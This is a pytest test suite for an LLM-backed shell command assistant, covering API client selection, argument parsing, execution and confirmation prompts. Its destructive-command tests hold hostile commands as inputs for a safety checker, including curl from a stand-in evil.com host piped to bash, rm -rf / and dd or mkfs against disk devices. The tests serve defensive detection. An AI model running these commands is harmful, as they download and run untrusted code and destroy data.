#!/usr/bin/env python3
"""
Comprehensive test suite for shell_assist.

This module contains unit tests for all shell_assist functionality,
including mocked API calls, argument parsing, safety checks, and execution.

Run with: pytest test_shell_assist.py -v
"""

import os
import sys
import subprocess
from unittest import mock
from unittest.mock import MagicMock, patch, call
import pytest

# Import the module under test
import shell_assist


class TestDetectShell:
    """Tests for shell detection functionality."""

    def test_detect_shell_from_env(self):
        """Test shell detection from SHELL environment variable."""
        with patch.dict(os.environ, {'SHELL': '/bin/bash'}):
            assert shell_assist.detect_shell() == 'bash'

    def test_detect_shell_zsh(self):
        """Test zsh detection."""
        with patch.dict(os.environ, {'SHELL': '/usr/bin/zsh'}):
            assert shell_assist.detect_shell() == 'zsh'

    def test_detect_shell_fish(self):
        """Test fish detection."""
        with patch.dict(os.environ, {'SHELL': '/usr/local/bin/fish'}):
            assert shell_assist.detect_shell() == 'fish'

    def test_detect_shell_default(self):
        """Test default shell when SHELL is not set."""
        with patch.dict(os.environ, {'SHELL': ''}):
            with patch('builtins.open', side_effect=FileNotFoundError):
                result = shell_assist.detect_shell()
                assert result == 'bash'

    def test_detect_shell_from_proc(self):
        """Test shell detection from /proc when SHELL is invalid."""
        with patch.dict(os.environ, {'SHELL': '/invalid/shell'}):
            mock_open = mock.mock_open(read_data='zsh\n')
            with patch('builtins.open', mock_open):
                result = shell_assist.detect_shell()
                assert result == 'zsh'


class TestDestructiveCommandChecks:
    """Tests for destructive command detection."""

    def test_rm_command_warning(self):
        """Test warning for rm command."""
        warnings = shell_assist.check_destructive_commands("rm file.txt")
        assert any('rm' in w.lower() for w in warnings)

    def test_rm_rf_root_danger(self):
        """Test danger detection for rm -rf /."""
        warnings = shell_assist.check_destructive_commands("rm -rf /")
        assert any('DANGER' in w for w in warnings)

    def test_dd_device_danger(self):
        """Test danger detection for dd to device."""
        warnings = shell_assist.check_destructive_commands("dd if=/dev/zero of=/dev/sda")
        assert any('DANGER' in w for w in warnings)

    def test_curl_pipe_bash_danger(self):
        """Test danger detection for curl piped to bash."""
        warnings = shell_assist.check_destructive_commands("curl http://evil.com | bash")
        assert any('DANGER' in w for w in warnings)

    def test_sudo_curl_pipe_bash(self):
        """Test danger detection for sudo curl piped to bash."""
        warnings = shell_assist.check_destructive_commands("curl http://evil.com | sudo bash")
        assert any('DANGER' in w for w in warnings)

    def test_chmod_777_warning(self):
        """Test warning for chmod 777."""
        warnings = shell_assist.check_destructive_commands("chmod 777 /var/www")
        assert any('777' in w or 'permissive' in w.lower() for w in warnings)

    def test_safe_command_no_warning(self):
        """Test that safe commands don't trigger warnings."""
        warnings = shell_assist.check_destructive_commands("ls -la")
        assert len(warnings) == 0

    def test_find_command_no_warning(self):
        """Test that find without destructive action is safe."""
        warnings = shell_assist.check_destructive_commands("find . -name '*.py'")
        assert len(warnings) == 0

    def test_mkfs_danger(self):
        """Test danger detection for mkfs."""
        warnings = shell_assist.check_destructive_commands("mkfs.ext4 /dev/sdb1")
        assert any('DANGER' in w for w in warnings)

    def test_kill_warning(self):
        """Test warning for kill command."""
        warnings = shell_assist.check_destructive_commands("kill -9 1234")
        assert any('kill' in w.lower() for w in warnings)

    def test_reboot_warning(self):
        """Test warning for reboot command."""
        warnings = shell_assist.check_destructive_commands("reboot")
        assert any('reboot' in w.lower() for w in warnings)

    def test_piped_rm_warning(self):
        """Test warning for rm in a pipeline."""
        warnings = shell_assist.check_destructive_commands("find . | xargs rm")
        assert any('rm' in w.lower() for w in warnings)


class TestAPIClientSelection:
    """Tests for API client selection based on environment variables."""

    def test_openai_selected_first(self):
        """Test that OpenAI is selected when key is available."""
        mock_openai = MagicMock()
        with patch.dict(os.environ, {
            'OPENAI_API_KEY': 'test-key',
            'ANTHROPIC_API_KEY': '',
            'GOOGLE_API_KEY': ''
        }, clear=False):
            with patch.dict(sys.modules, {'openai': mock_openai}):
                mock_openai.OpenAI = MagicMock(return_value='openai_client')
                provider, client = shell_assist.get_api_client()
                assert provider == 'openai'

    def test_anthropic_selected_when_no_openai(self):
        """Test that Anthropic is selected when OpenAI key is missing."""
        mock_anthropic = MagicMock()
        with patch.dict(os.environ, {
            'OPENAI_API_KEY': '',
            'ANTHROPIC_API_KEY': 'test-key',
            'GOOGLE_API_KEY': ''
        }, clear=False):
            # Make openai import fail
            with patch.dict(sys.modules, {'openai': None}):
                with patch.dict(sys.modules, {'anthropic': mock_anthropic}):
                    mock_anthropic.Anthropic = MagicMock(return_value='anthropic_client')
                    provider, client = shell_assist.get_api_client()
                    assert provider == 'anthropic'

    def test_no_api_key_raises_error(self):
        """Test that missing API keys raise EnvironmentError."""
        with patch.dict(os.environ, {
            'OPENAI_API_KEY': '',
            'ANTHROPIC_API_KEY': '',
            'GOOGLE_API_KEY': ''
        }, clear=False):
            with pytest.raises(EnvironmentError) as exc_info:
                shell_assist.get_api_client()
            assert 'No API key found' in str(exc_info.value)


class TestLLMCalls:
    """Tests for LLM API calls with mocking."""

    def test_call_llm_openai(self):
        """Test OpenAI LLM call."""
        mock_client = MagicMock()
        mock_response = MagicMock()
        mock_response.choices = [MagicMock()]
        mock_response.choices[0].message.content = "ls -la"
        mock_client.chat.completions.create.return_value = mock_response

        result = shell_assist.call_llm('openai', mock_client, 'list files', 'system prompt')
        assert result == "ls -la"
        mock_client.chat.completions.create.assert_called_once()

    def test_call_llm_anthropic(self):
        """Test Anthropic LLM call."""
        mock_client = MagicMock()
        mock_response = MagicMock()
        mock_response.content = [MagicMock()]
        mock_response.content[0].text = "ls -la"
        mock_client.messages.create.return_value = mock_response

        result = shell_assist.call_llm('anthropic', mock_client, 'list files', 'system prompt')
        assert result == "ls -la"
        mock_client.messages.create.assert_called_once()

    def test_call_llm_google(self):
        """Test Google LLM call."""
        mock_client = MagicMock()
        mock_model = MagicMock()
        mock_response = MagicMock()
        mock_response.text = "ls -la"
        mock_model.generate_content.return_value = mock_response
        mock_client.GenerativeModel.return_value = mock_model

        result = shell_assist.call_llm('google', mock_client, 'list files', 'system prompt')
        assert result == "ls -la"
        mock_client.GenerativeModel.assert_called_once()

    def test_call_llm_unknown_provider(self):
        """Test that unknown provider raises ValueError."""
        with pytest.raises(ValueError) as exc_info:
            shell_assist.call_llm('unknown', MagicMock(), 'prompt', 'system')
        assert 'Unknown provider' in str(exc_info.value)


class TestGenerateCommand:
    """Tests for command generation."""

    @patch('shell_assist.get_api_client')
    @patch('shell_assist.call_llm')
    def test_generate_command_basic(self, mock_call_llm, mock_get_client):
        """Test basic command generation."""
        mock_get_client.return_value = ('openai', MagicMock())
        mock_call_llm.return_value = "find . -name '*.py'"

        result = shell_assist.generate_command("find python files", "bash")
        assert result == "find . -name '*.py'"

    @patch('shell_assist.get_api_client')
    @patch('shell_assist.call_llm')
    def test_generate_command_includes_shell(self, mock_call_llm, mock_get_client):
        """Test that shell type is passed to LLM."""
        mock_get_client.return_value = ('openai', MagicMock())
        mock_call_llm.return_value = "some command"

        shell_assist.generate_command("test query", "zsh")

        # Check that the prompt mentions zsh
        call_args = mock_call_llm.call_args
        assert 'zsh' in call_args[0][2]  # prompt argument


class TestExplainCommand:
    """Tests for command explanation."""

    @patch('shell_assist.get_api_client')
    @patch('shell_assist.call_llm')
    def test_explain_command(self, mock_call_llm, mock_get_client):
        """Test command explanation."""
        mock_get_client.return_value = ('anthropic', MagicMock())
        mock_call_llm.return_value = "This command finds Python files..."

        result = shell_assist.explain_command("find . -name '*.py'", "bash")
        assert "finds" in result.lower() or "python" in result.lower()


class TestFixCommand:
    """Tests for command fixing/improvement."""

    @patch('shell_assist.get_api_client')
    @patch('shell_assist.call_llm')
    def test_fix_command(self, mock_call_llm, mock_get_client):
        """Test command improvement suggestions."""
        mock_get_client.return_value = ('anthropic', MagicMock())
        mock_call_llm.return_value = "Consider using -r flag for recursive search"

        result = shell_assist.fix_command("grep pattern", "bash")
        assert "recursive" in result.lower() or "flag" in result.lower()


class TestExecuteCommand:
    """Tests for command execution."""

    def test_execute_simple_command(self):
        """Test executing a simple echo command."""
        code, stdout, stderr = shell_assist.execute_command("echo 'hello'", "bash")
        assert code == 0
        assert "hello" in stdout

    def test_execute_failing_command(self):
        """Test executing a command that fails."""
        code, stdout, stderr = shell_assist.execute_command("exit 42", "bash")
        assert code == 42

    def test_execute_with_stderr(self):
        """Test command that produces stderr output."""
        code, stdout, stderr = shell_assist.execute_command("ls /nonexistent 2>&1", "bash")
        assert code != 0

    @patch('subprocess.run')
    def test_execute_timeout(self, mock_run):
        """Test command execution timeout."""
        mock_run.side_effect = subprocess.TimeoutExpired(cmd='test', timeout=60)
        code, stdout, stderr = shell_assist.execute_command("sleep 100", "bash")
        assert code == 124
        assert 'timeout' in stderr.lower()


class TestConfirmExecution:
    """Tests for execution confirmation prompt."""

    @patch('builtins.input', return_value='y')
    def test_confirm_yes(self, mock_input):
        """Test confirmation with 'y' response."""
        result = shell_assist.confirm_execution("ls -la")
        assert result is True

    @patch('builtins.input', return_value='yes')
    def test_confirm_yes_full(self, mock_input):
        """Test confirmation with 'yes' response."""
        result = shell_assist.confirm_execution("ls -la")
        assert result is True

    @patch('builtins.input', return_value='n')
    def test_confirm_no(self, mock_input):
        """Test confirmation with 'n' response."""
        result = shell_assist.confirm_execution("ls -la")
        assert result is False

    @patch('builtins.input', return_value='')
    def test_confirm_empty(self, mock_input):
        """Test confirmation with empty response (default no)."""
        result = shell_assist.confirm_execution("ls -la")
        assert result is False

    @patch('builtins.input', side_effect=EOFError)
    def test_confirm_eof(self, mock_input):
        """Test confirmation with EOF (Ctrl+D)."""
        result = shell_assist.confirm_execution("ls -la")
        assert result is False

    @patch('builtins.input', side_effect=KeyboardInterrupt)
    def test_confirm_interrupt(self, mock_input):
        """Test confirmation with keyboard interrupt."""
        result = shell_assist.confirm_execution("ls -la")
        assert result is False


class TestArgumentParser:
    """Tests for argument parsing."""

    def test_parser_basic_query(self):
        """Test parsing a basic query."""
        parser = shell_assist.create_parser()
        args = parser.parse_args(["find python files"])
        assert args.query == "find python files"

    def test_parser_explain_mode(self):
        """Test parsing explain mode."""
        parser = shell_assist.create_parser()
        args = parser.parse_args(["explain", "ls -la"])
        assert args.mode == "explain"
        assert args.query == "ls -la"

    def test_parser_fix_mode(self):
        """Test parsing fix mode."""
        parser = shell_assist.create_parser()
        args = parser.parse_args(["fix", "grep pattern"])
        assert args.mode == "fix"
        assert args.query == "grep pattern"

    def test_parser_shell_option(self):
        """Test parsing --shell option."""
        parser = shell_assist.create_parser()
        args = parser.parse_args(["query", "--shell", "zsh"])
        assert args.shell == "zsh"

    def test_parser_shell_short_option(self):
        """Test parsing -s option."""
        parser = shell_assist.create_parser()
        args = parser.parse_args(["query", "-s", "fish"])
        assert args.shell == "fish"

    def test_parser_execute_flag(self):
        """Test parsing --execute flag."""
        parser = shell_assist.create_parser()
        args = parser.parse_args(["query", "--execute"])
        assert args.execute is True

    def test_parser_execute_short_flag(self):
        """Test parsing -x flag."""
        parser = shell_assist.create_parser()
        args = parser.parse_args(["query", "-x"])
        assert args.execute is True

    def test_parser_yes_flag(self):
        """Test parsing --yes flag."""
        parser = shell_assist.create_parser()
        args = parser.parse_args(["query", "--yes"])
        assert args.yes is True

    def test_parser_no_warnings_flag(self):
        """Test parsing --no-warnings flag."""
        parser = shell_assist.create_parser()
        args = parser.parse_args(["query", "--no-warnings"])
        assert args.no_warnings is True


class TestMainFunction:
    """Tests for the main entry point."""

    @patch('shell_assist.get_api_client')
    @patch('shell_assist.call_llm')
    def test_main_generate(self, mock_call_llm, mock_get_client):
        """Test main function with generate mode."""
        mock_get_client.return_value = ('openai', MagicMock())
        mock_call_llm.return_value = "ls -la"

        exit_code = shell_assist.main(["list files"])
        assert exit_code == shell_assist.EXIT_SUCCESS

    @patch('shell_assist.get_api_client')
    @patch('shell_assist.call_llm')
    def test_main_explain(self, mock_call_llm, mock_get_client):
        """Test main function with explain mode."""
        mock_get_client.return_value = ('openai', MagicMock())
        mock_call_llm.return_value = "This command lists files..."

        exit_code = shell_assist.main(["explain", "ls -la"])
        assert exit_code == shell_assist.EXIT_SUCCESS

    @patch('shell_assist.get_api_client')
    @patch('shell_assist.call_llm')
    def test_main_fix(self, mock_call_llm, mock_get_client):
        """Test main function with fix mode."""
        mock_get_client.return_value = ('openai', MagicMock())
        mock_call_llm.return_value = "Consider using -r flag..."

        exit_code = shell_assist.main(["fix", "grep pattern"])
        assert exit_code == shell_assist.EXIT_SUCCESS

    def test_main_no_args(self):
        """Test main function with no arguments."""
        exit_code = shell_assist.main([])
        assert exit_code == shell_assist.EXIT_INVALID_ARGS

    @patch('shell_assist.get_api_client')
    def test_main_api_error(self, mock_get_client):
        """Test main function with API error."""
        mock_get_client.side_effect = EnvironmentError("No API key")

        exit_code = shell_assist.main(["test query"])
        assert exit_code == shell_assist.EXIT_API_ERROR

    @patch('shell_assist.get_api_client')
    @patch('shell_assist.call_llm')
    @patch('shell_assist.execute_command')
    @patch('shell_assist.confirm_execution')
    def test_main_execute_success(self, mock_confirm, mock_exec, mock_call_llm, mock_get_client):
        """Test main function with successful execution."""
        mock_get_client.return_value = ('openai', MagicMock())
        mock_call_llm.return_value = "echo hello"
        mock_confirm.return_value = True
        mock_exec.return_value = (0, "hello\n", "")

        exit_code = shell_assist.main(["say hello", "--execute"])
        assert exit_code == shell_assist.EXIT_SUCCESS

    @patch('shell_assist.get_api_client')
    @patch('shell_assist.call_llm')
    @patch('shell_assist.execute_command')
    @patch('shell_assist.confirm_execution')
    def test_main_execute_failure(self, mock_confirm, mock_exec, mock_call_llm, mock_get_client):
        """Test main function with failed execution."""
        mock_get_client.return_value = ('openai', MagicMock())
        mock_call_llm.return_value = "false"
        mock_confirm.return_value = True
        mock_exec.return_value = (1, "", "error")

        exit_code = shell_assist.main(["run false", "--execute"])
        assert exit_code == shell_assist.EXIT_EXECUTION_ERROR

    @patch('shell_assist.get_api_client')
    @patch('shell_assist.call_llm')
    @patch('shell_assist.confirm_execution')
    def test_main_execute_cancelled(self, mock_confirm, mock_call_llm, mock_get_client):
        """Test main function with cancelled execution."""
        mock_get_client.return_value = ('openai', MagicMock())
        mock_call_llm.return_value = "ls"
        mock_confirm.return_value = False

        exit_code = shell_assist.main(["list files", "--execute"])
        assert exit_code == shell_assist.EXIT_SUCCESS

    @patch('shell_assist.get_api_client')
    @patch('shell_assist.call_llm')
    @patch('shell_assist.execute_command')
    def test_main_execute_with_yes(self, mock_exec, mock_call_llm, mock_get_client):
        """Test main function with --yes flag (skip confirmation)."""
        mock_get_client.return_value = ('openai', MagicMock())
        mock_call_llm.return_value = "echo test"
        mock_exec.return_value = (0, "test\n", "")

        exit_code = shell_assist.main(["echo test", "--execute", "--yes"])
        assert exit_code == shell_assist.EXIT_SUCCESS
        mock_exec.assert_called_once()

    @patch('shell_assist.get_api_client')
    @patch('shell_assist.call_llm')
    def test_main_cleans_markdown(self, mock_call_llm, mock_get_client, capsys):
        """Test that markdown code blocks are cleaned from output."""
        mock_get_client.return_value = ('openai', MagicMock())
        mock_call_llm.return_value = "```bash\nls -la\n```"

        exit_code = shell_assist.main(["list files"])
        captured = capsys.readouterr()

        assert exit_code == shell_assist.EXIT_SUCCESS
        assert "```" not in captured.out
        assert "ls -la" in captured.out


class TestExitCodes:
    """Tests to verify exit code constants."""

    def test_exit_codes_values(self):
        """Test that exit codes have expected values."""
        assert shell_assist.EXIT_SUCCESS == 0
        assert shell_assist.EXIT_API_ERROR == 1
        assert shell_assist.EXIT_EXECUTION_ERROR == 2
        assert shell_assist.EXIT_INVALID_ARGS == 3


class TestVersionInfo:
    """Tests for version information."""

    def test_version_defined(self):
        """Test that version is defined."""
        assert hasattr(shell_assist, '__version__')
        assert isinstance(shell_assist.__version__, str)
        assert len(shell_assist.__version__) > 0


class TestIntegration:
    """Integration tests (require API keys or are skipped)."""

    @pytest.mark.skipif(
        not any([
            os.environ.get('OPENAI_API_KEY'),
            os.environ.get('ANTHROPIC_API_KEY'),
            os.environ.get('GOOGLE_API_KEY')
        ]),
        reason="No API key available"
    )
    def test_real_api_call(self):
        """Integration test with real API (skipped if no key)."""
        # This test only runs if an API key is available
        exit_code = shell_assist.main(["explain", "ls -la"])
        assert exit_code == shell_assist.EXIT_SUCCESS


class TestEdgeCases:
    """Tests for edge cases and boundary conditions."""

    def test_empty_command_warnings(self):
        """Test checking empty command for warnings."""
        warnings = shell_assist.check_destructive_commands("")
        assert len(warnings) == 0

    def test_whitespace_only_command(self):
        """Test checking whitespace-only command."""
        warnings = shell_assist.check_destructive_commands("   ")
        assert len(warnings) == 0

    @patch('shell_assist.get_api_client')
    @patch('shell_assist.call_llm')
    def test_special_characters_in_query(self, mock_call_llm, mock_get_client):
        """Test query with special characters."""
        mock_get_client.return_value = ('openai', MagicMock())
        mock_call_llm.return_value = "ls"

        # Should not raise
        exit_code = shell_assist.main(["find files with 'quotes' and \"double quotes\""])
        assert exit_code == shell_assist.EXIT_SUCCESS

    def test_command_with_unicode(self):
        """Test command with unicode characters."""
        warnings = shell_assist.check_destructive_commands("echo ''"
)
        assert len(warnings) == 0

    @patch('shutil.which')
    def test_execute_with_fallback_shell(self, mock_which):
        """Test execution when specified shell is not found."""
        mock_which.side_effect = lambda x: '/bin/sh' if x == 'sh' else None

        code, stdout, stderr = shell_assist.execute_command("echo test", "nonexistent_shell")
        # Should fall back to sh and work
        assert code == 0


if __name__ == '__main__':
    pytest.main([__file__, '-v'])
